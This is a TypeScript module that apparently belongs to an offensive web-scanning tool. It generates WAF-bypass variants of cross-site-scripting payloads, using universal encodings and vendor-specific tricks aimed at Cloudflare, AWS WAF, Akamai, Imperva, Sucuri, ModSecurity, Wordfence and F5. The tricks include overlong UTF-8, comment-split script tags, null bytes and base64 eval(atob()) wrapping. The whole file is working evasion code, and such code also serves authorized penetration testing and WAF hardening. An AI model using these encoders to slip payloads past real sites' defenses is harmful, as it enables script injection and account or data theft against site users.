/**
 * Payload Encoder (Phase 20G)
 *
 * Generates WAF bypass variants for payloads using encoding strategies
 * tailored to specific WAF vendors. Each WAF has known parsing discrepancies
 * that can be exploited — 1,207+ bypass techniques documented in research.
 *
 * Encoding strategies include:
 * - Universal: URL encoding, double URL encoding, mixed case, null bytes
 * - Cloudflare: Unicode normalization, chunked transfer, fullwidth chars
 * - AWS WAF: JSON body bypass, overlong UTF-8 sequences
 * - Akamai: HTTP parameter pollution, pragma header abuse
 * - Imperva: Path normalization, double encoding
 */

import type { WAFVendor } from './waf_detector';

// ─── Types ───────────────────────────────────────────────────────────────────

export interface EncodingStrategy {
  name: string;
  description: string;
  encode: (payload: string) => string;
}

// ─── Universal Encoding Strategies ───────────────────────────────────────────

const UNIVERSAL_ENCODINGS: EncodingStrategy[] = [
  {
    name: 'url_encode',
    description: 'Standard URL encoding',
    encode: (p) => encodeURIComponent(p),
  },
  {
    name: 'double_url_encode',
    description: 'Double URL encoding',
    encode: (p) => encodeURIComponent(encodeURIComponent(p)),
  },
  {
    name: 'html_entities',
    description: 'HTML entity encoding',
    encode: (p) => p.replace(/</g, '&#60;').replace(/>/g, '&#62;').replace(/"/g, '&#34;').replace(/'/g, '&#39;'),
  },
  {
    name: 'unicode_escape',
    description: 'Unicode escape sequences for angle brackets',
    encode: (p) => p.replace(/</g, '\\u003c').replace(/>/g, '\\u003e').replace(/"/g, '\\u0022'),
  },
  {
    name: 'mixed_case',
    description: 'Randomize letter casing in HTML tags',
    encode: (p) => p.replace(/[a-zA-Z]/g, (char, i) =>
      i % 2 === 0 ? char.toUpperCase() : char.toLowerCase(),
    ),
  },
  {
    name: 'null_byte_prefix',
    description: 'Null byte insertion before angle brackets',
    encode: (p) => p.replace(/</g, '%00<').replace(/>/g, '%00>'),
  },
  {
    name: 'tab_newline_insert',
    description: 'Tab/newline insertion in tags to break regex matching',
    encode: (p) => p
      .replace(/<script/gi, '<\tscript')
      .replace(/<img/gi, '<\nimg')
      .replace(/<svg/gi, '<\tsvg'),
  },
  {
    name: 'hex_entities',
    description: 'Hexadecimal HTML entities',
    encode: (p) => p.replace(/</g, '&#x3c;').replace(/>/g, '&#x3e;').replace(/"/g, '&#x22;'),
  },
  {
    name: 'decimal_entities',
    description: 'Decimal HTML entities with zero-padding',
    encode: (p) => p.replace(/</g, '&#0060;').replace(/>/g, '&#0062;'),
  },
  {
    name: 'concatenation_break',
    description: 'Break payload across comment boundaries',
    encode: (p) => p.replace('alert', 'al\'+\'ert').replace('script', 'scr\'+\'ipt'),
  },
];

// ─── WAF-Specific Encoding Strategies ────────────────────────────────────────

const WAF_SPECIFIC_ENCODINGS: Partial<Record<WAFVendor, EncodingStrategy[]>> = {
  cloudflare: [
    {
      name: 'cf_fullwidth_chars',
      description: 'Unicode fullwidth character bypass',
      encode: (p) => p
        .replace(/</g, '\uff1c')    // ＜
        .replace(/>/g, '\uff1e')    // ＞
        .replace(/"/g, '\uff02')    // ＂
        .replace(/'/g, '\uff07'),   // ＇
    },
    {
      name: 'cf_comment_bypass',
      description: 'HTML comment insertion to break signatures',
      encode: (p) => p.replace(/<script/gi, '<scr<!---->ipt'),
    },
    {
      name: 'cf_backtick_eval',
      description: 'Use backtick template literals instead of parentheses',
      encode: (p) => p.replace(/alert\(1\)/g, 'alert`1`').replace(/alert\(document\.domain\)/g, 'alert`${document.domain}`'),
    },
  ],
  aws_waf: [
    {
      name: 'aws_overlong_utf8',
      description: 'Overlong UTF-8 sequences for angle brackets',
      encode: (p) => p.replace(/</g, '%c0%bc').replace(/>/g, '%c0%be'),
    },
    {
      name: 'aws_case_variation',
      description: 'Aggressive case variation to bypass regex rules',
      encode: (p) => {
        let result = '';
        for (let i = 0; i < p.length; i++) {
          result += Math.random() > 0.5 ? p[i].toUpperCase() : p[i].toLowerCase();
        }
        return result;
      },
    },
    {
      name: 'aws_whitespace_variant',
      description: 'Non-standard whitespace between tag and attributes',
      encode: (p) => p.replace(/\s+/g, '\x0c'),  // Form feed as whitespace
    },
  ],
  akamai: [
    {
      name: 'akamai_hpp',
      description: 'HTTP parameter pollution — duplicate parameter names',
      encode: (p) => p,  // HPP is applied at the request level, not payload level
    },
    {
      name: 'akamai_double_encode_selective',
      description: 'Selectively double-encode only critical characters',
      encode: (p) => p.replace(/</g, '%253c').replace(/>/g, '%253e'),
    },
    {
      name: 'akamai_path_traversal_bypass',
      description: 'Use /./ and // in paths to bypass path-based rules',
      encode: (p) => p.replace(/\//g, '/./'),
    },
  ],
  imperva: [
    {
      name: 'imperva_path_norm',
      description: 'Path normalization bypass using /./admin, //admin',
      encode: (p) => p.replace(/\//g, '//'),
    },
    {
      name: 'imperva_newline_bypass',
      description: 'Newline injection in headers/parameters',
      encode: (p) => p.replace(/<script/gi, '<%0ascript'),
    },
    {
      name: 'imperva_unicode_decompose',
      description: 'Unicode decomposition bypass',
      encode: (p) => p.replace(/</g, '\u2039').replace(/>/g, '\u203a'),  // ‹ and ›
    },
  ],
  sucuri: [
    {
      name: 'sucuri_double_encode',
      description: 'Double URL encoding bypass',
      encode: (p) => encodeURIComponent(encodeURIComponent(p)),
    },
    {
      name: 'sucuri_null_byte',
      description: 'Null byte bypass',
      encode: (p) => p.replace(/<script/gi, '<%00script'),
    },
  ],
  modsecurity: [
    {
      name: 'modsec_multipart',
      description: 'Multipart content-type bypass',
      encode: (p) => p,  // Applied at request level
    },
    {
      name: 'modsec_unicode_fullwidth',
      description: 'Fullwidth Unicode characters',
      encode: (p) => p
        .replace(/</g, '\uff1c')
        .replace(/>/g, '\uff1e'),
    },
    {
      name: 'modsec_concatenation',
      description: 'String concatenation in JavaScript payloads',
      encode: (p) => p.replace('alert', 'window["al"+"ert"]'),
    },
  ],
  wordfence: [
    {
      name: 'wordfence_base64',
      description: 'Base64 encoding within eval context',
      encode: (p) => {
        // Only encode the JavaScript portion for XSS payloads
        const jsMatch = p.match(/alert\([^)]*\)/);
        if (jsMatch) {
          const b64 = typeof btoa === 'function'
            ? btoa(jsMatch[0])
            : Buffer.from(jsMatch[0]).toString('base64');
          return p.replace(jsMatch[0], `eval(atob('${b64}'))`);
        }
        return p;
      },
    },
    {
      name: 'wordfence_event_handler',
      description: 'Alternative event handler bypass',
      encode: (p) => p
        .replace(/onerror/gi, 'oNError')
        .replace(/onload/gi, 'oNloAd'),
    },
  ],
  f5_bigip: [
    {
      name: 'f5_fragment_bypass',
      description: 'Fragment payload across multiple parameters',
      encode: (p) => p.replace(/<script>/gi, '<scr%00ipt>'),
    },
  ],
};

// ─── Payload Encoder ─────────────────────────────────────────────────────────

export class PayloadEncoder {
  /** Get encoding strategies effective against a specific WAF */
  getStrategiesForWAF(wafVendor: WAFVendor): EncodingStrategy[] {
    const strategies: EncodingStrategy[] = [...UNIVERSAL_ENCODINGS];

    const specific = WAF_SPECIFIC_ENCODINGS[wafVendor];
    if (specific) {
      strategies.push(...specific);
    }

    return strategies;
  }

  /** Apply all relevant encodings to a payload, returning unique variants */
  encodePayload(payload: string, wafVendor: WAFVendor): string[] {
    const strategies = this.getStrategiesForWAF(wafVendor);
    const variants = new Set<string>();

    // Always include the raw payload
    variants.add(payload);

    for (const strategy of strategies) {
      try {
        const encoded = strategy.encode(payload);
        if (encoded && encoded !== payload) {
          variants.add(encoded);
        }
      } catch {
        // Skip encoding strategies that fail on this payload
      }
    }

    return [...variants];
  }

  /** Apply a specific encoding chain to a payload (encode1 → encode2 → ...) */
  applyChain(payload: string, strategies: EncodingStrategy[]): string {
    let result = payload;
    for (const strategy of strategies) {
      try {
        result = strategy.encode(result);
      } catch {
        // Skip strategies that fail
      }
    }
    return result;
  }

  /** Get the number of unique variants for a payload against a WAF */
  getVariantCount(payload: string, wafVendor: WAFVendor): number {
    return this.encodePayload(payload, wafVendor).length;
  }
}

// ─── Exports ─────────────────────────────────────────────────────────────────

export { UNIVERSAL_ENCODINGS, WAF_SPECIFIC_ENCODINGS };
